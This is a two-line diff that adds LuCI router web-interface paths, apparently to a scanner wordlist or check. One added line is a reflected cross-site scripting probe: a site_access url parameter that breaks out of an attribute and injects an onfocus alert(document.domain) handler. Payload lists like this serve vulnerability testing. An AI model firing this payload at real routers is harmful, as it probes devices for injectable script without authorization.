@@ -1,0 +1,2 @@
+/cgi-bin/luci/
+/cgi-bin/luci/site_access/?url=%22%20onfocus=alert(document.domain)%20autofocus=1
